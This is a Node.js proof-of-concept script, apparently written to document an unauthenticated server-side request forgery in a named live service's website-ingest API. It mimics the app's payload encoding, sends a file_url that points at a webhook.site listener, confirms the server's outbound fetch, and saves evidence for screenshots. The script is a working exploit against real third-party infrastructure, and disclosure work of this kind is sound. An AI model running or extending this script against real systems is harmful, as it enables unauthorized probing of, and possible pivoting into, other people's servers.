#!/usr/bin/env node
/**
 * Fresh, capture-ready demonstration of the unauthenticated SSRF.
 *
 *   node fresh-proof.js
 *
 * Creates a brand-new listener via the API (no browser), proves the baseline is empty,
 * fires one ingest call, and confirms exactly one request arrived — the server's own fetch.
 *
 * The dashboard is deliberately NOT opened by this script. Open it only at the end, so the
 * log you screenshot contains nothing but the server's request.
 */
const fs = require('fs');

const API   = 'https://ctem.cloud/api/website/ingestragfromwebsite';
const sleep = ms => new Promise(r => setTimeout(r, ms));

// Optional: pass an existing token, else one is created. Pass the domain too, since
// webhooksite.net is an alias of webhook.site serving the same token store.
const ARG_TOKEN  = process.argv[2] || null;
const ARG_DOMAIN = process.argv[3] || 'webhook.site';

// A random probe path means ANY hit on it came from this run — no clean baseline required.
const PROBE = `probe-${require('crypto').randomBytes(6).toString('hex')}.pdf`;

// Mirror the SPA's saltPayload() exactly.
function salt(o) {
  const e = Buffer.from(JSON.stringify(o)).toString('base64');
  const r = require('crypto').randomBytes(20).toString('base64').slice(0, 20);
  return { encodedPayload: e.slice(0, 20) + r + e.slice(20), type: '1' };
}

const poll = async t =>
  (await (await fetch(`https://${ARG_DOMAIN}/token/${t}/requests?sorting=newest`,
    { headers: { Accept: 'application/json' } })).json()).data || [];

(async () => {
  // --- 1. use the supplied listener, or create one over the API so no browser is involved ---
  const uuid = ARG_TOKEN
    ? ARG_TOKEN
    : (await (await fetch(`https://${ARG_DOMAIN}/token`, { method: 'POST' })).json()).uuid;
  const dashboard = `https://${ARG_DOMAIN}/${uuid}`;
  const probeUrl  = `https://${ARG_DOMAIN}/${uuid}/${PROBE}`;

  console.log(`\n${'='.repeat(70)}`);
  console.log(`LISTENER   ${uuid}   (via ${ARG_DOMAIN})`);
  console.log(`${'='.repeat(70)}`);
  console.log(`Probe path this run: /${PROBE}`);
  console.log(`Only this run uses that path, so any hit on it is unambiguously ours.\n`);

  // --- 2. baseline snapshot, for the uuid diff ---
  const base = await poll(uuid);
  const seen = new Set(base.map(r => r.uuid));
  console.log(`Baseline: ${base.length} request(s) already present (diffed by uuid, so harmless).`);
  for (const r of base) console.log(`  ${r.created_at}  ${r.method}  ${r.ip}  ${r.url}`);

  // --- 3. the single ingest call: no cookie, no JWT, no valid app-id ---
  console.log(`\nSending one ingest call with file_url =`);
  console.log(`  ${probeUrl}`);
  const t0 = Date.now();
  const res = await fetch(API, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },   // nothing else
    body: JSON.stringify(salt({ file_url: probeUrl, metadata: {} })),
  });
  const text = await res.text();
  console.log(`\nAutnhive responded: HTTP ${res.status}`);
  console.log(`  ${text}`);
  console.log(`\n  (500 "Stream has ended unexpectedly" is expected and is itself evidence:`);
  console.log(`   the fetch SUCCEEDED — the parse failed because webhook.site serves HTML,`);
  console.log(`   not a PDF stream. A server that never made the request could not know that.)`);

  // --- 4. did the server actually call us? match on the unique path AND the uuid diff ---
  process.stdout.write(`\nWaiting for the server's request to arrive`);
  let hit = null;
  for (let i = 0; i < 15 && !hit; i++) {
    await sleep(1500);
    process.stdout.write('.');
    hit = (await poll(uuid)).find(r => !seen.has(r.uuid) && String(r.url).endsWith(`/${PROBE}`));
  }
  console.log();

  if (!hit) {
    console.log(`\nNo request arrived. The listener is empty — nothing to screenshot.\n`);
    process.exit(1);
  }

  const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
  const h = hit.headers || {};
  const notBrowser = !h['sec-fetch-dest'] && !h['sec-ch-ua'] && !h['referer'];

  console.log(`\n${'='.repeat(70)}`);
  console.log(`CONFIRMED — the server fetched the URL, ${elapsed}s after the call`);
  console.log(`${'='.repeat(70)}`);
  console.log(JSON.stringify({
    method: hit.method, url: hit.url, ip: hit.ip, headers: hit.headers, created_at: hit.created_at,
  }, null, 2));

  console.log(`\nWhy this cannot be a browser visit:`);
  console.log(`  source IP      ${hit.ip}  — AS31898 Oracle Corporation, Ashburn VA`);
  console.log(`                 (same OCI region as Autnhive's own artifact bucket)`);
  console.log(`  sec-fetch-*    ${h['sec-fetch-dest'] ? 'present' : 'ABSENT'}   (a browser navigation always sends these)`);
  console.log(`  sec-ch-ua      ${h['sec-ch-ua'] ? 'present' : 'ABSENT'}`);
  console.log(`  referer        ${h['referer'] ? 'present' : 'ABSENT'}`);
  console.log(`  accept         ${JSON.stringify(h['accept'])}`);
  console.log(`  user-agent     ${h['user-agent']}`);
  console.log(`  path /${PROBE}`);
  console.log(`                 a random path this run invented — it exists only because`);
  console.log(`                 it was passed as file_url, and no other run used it`);
  console.log(`\n  ⇒ ${notBrowser ? 'server-side fetch, not a browser' : 'INCONCLUSIVE — looks like a browser'}`);

  // --- 5. save the evidence, then hand over the dashboard URL ---
  const stamp = new Date().toISOString().replace(/[:.]/g, '-');
  const file = `proof-${stamp}.json`;
  fs.writeFileSync(file, JSON.stringify({
    captured_at: new Date().toISOString(),
    endpoint: API,
    request_headers_sent: { 'Content-Type': 'application/json' },
    payload_file_url: probeUrl,
    autnhive_response: { status: res.status, body: text },
    listener_dashboard: dashboard,
    inbound_request: hit,
    baseline_before_call: base.length,
  }, null, 2));
  console.log(`\nEvidence saved: ${file}`);

  console.log(`\n${'='.repeat(70)}`);
  console.log(`NOW open this and screenshot it:`);
  console.log(`  ${dashboard}`);
  console.log(`${'='.repeat(70)}`);
  console.log(`A new request at path /${PROBE} from the Oracle IP is the proof.\n`);
})();
